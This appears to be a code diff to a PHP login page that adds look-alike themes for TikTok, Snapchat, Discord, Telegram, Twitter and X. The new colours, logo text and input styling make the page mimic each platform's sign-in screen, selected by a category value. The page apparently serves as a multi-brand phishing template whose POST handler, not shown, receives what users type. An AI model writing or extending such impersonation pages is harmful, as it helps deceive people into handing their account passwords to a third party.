@@ -41,6 +41,50 @@ $brand_themes = [
         'logo_font' => "'Cookie', cursive",
         'logo_size' => '50px'
     ],
+    'tiktok' => [
+        'bg' => '#fff',
+        'primary' => '#fe2c55',
+        'logo_text' => 'TikTok',
+        'logo_font' => "sans-serif",
+        'logo_size' => '36px',
+        'logo_color' => '#000'
+    ],
+    'snapchat' => [
+        'bg' => '#fffc00',
+        'primary' => '#000',
+        'logo_text' => 'Snapchat',
+        'logo_color' => '#000'
+    ],
+    'discord' => [
+        'bg' => '#313338',
+        'primary' => '#5865f2',
+        'logo_text' => 'Discord',
+        'logo_color' => '#fff',
+        'card_bg' => '#313338',
+        'input_bg' => '#1e1f22',
+        'text_color' => '#dbdee1'
+    ],
+    'telegram' => [
+        'bg' => '#fff',
+        'primary' => '#33a0e3',
+        'logo_text' => 'Telegram',
+        'logo_color' => '#33a0e3'
+    ],
+    'twitter' => [
+        'bg' => '#fff',
+        'primary' => '#1d9bf0',
+        'logo_text' => 'Twitter',
+        'logo_color' => '#1d9bf0'
+    ],
+    'x' => [
+        'bg' => '#000',
+        'primary' => '#fff',
+        'btn_text' => '#000',
+        'logo_text' => 'X',
+        'logo_color' => '#fff',
+        'card_bg' => '#000',
+        'text_color' => '#fff'
+    ],
     'default' => [
         'bg' => '#f8f9fa',
         'primary' => '#4361ee',
@@ -88,6 +132,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            color: <?php echo $theme['text_color'] ?? '#1c1e21'; ?>;
         }
         .login-container {
             width: 100%;
@@ -96,10 +141,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             text-align: center;
         }
         .login-card {
-            background: #fff;
+            background: <?php echo $theme['card_bg'] ?? '#fff'; ?>;
             padding: 30px;
             border-radius: 8px;
             box-shadow: <?php echo $theme['card_shadow'] ?? '0 4px 12px rgba(0,0,0,0.08)'; ?>;
+            <?php if (strtolower($category) === 'discord'): ?>
+                border: 1px solid #1e1f22;
+            <?php endif; ?>
         }
         .brand-logo {
             font-size: <?php echo $theme['logo_size'] ?? '32px'; ?>;
@@ -117,11 +165,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         input {
             width: 100%;
             padding: 14px;
-            border: 1px solid #dddfe2;
+            border: 1px solid <?php echo (strtolower($category) === 'discord') ? '#1e1f22' : '#dddfe2'; ?>;
             border-radius: 6px;
             font-size: 15px;
             box-sizing: border-box;
             outline: none;
+            background-color: <?php echo $theme['input_bg'] ?? '#fff'; ?>;
+            color: inherit;
         }
         input:focus { border-color: <?php echo $theme['primary']; ?>; }
 
@@ -129,7 +179,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             width: 100%;
             padding: 14px;
             background-color: <?php echo $theme['primary']; ?>;
-            color: #fff;
+            color: <?php echo $theme['btn_text'] ?? '#fff'; ?>;
             border: none;
             border-radius: 6px;
             font-size: 18px;
@@ -143,7 +193,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         .links a { text-decoration: none; color: inherit; }
 
         .divider {
-            border-top: 1px solid #dadde1;
+            border-top: 1px solid <?php echo (strtolower($category) === 'discord') ? '#1e1f22' : '#dadde1'; ?>;
             margin: 20px 0;
             display: flex;
             align-items: center;
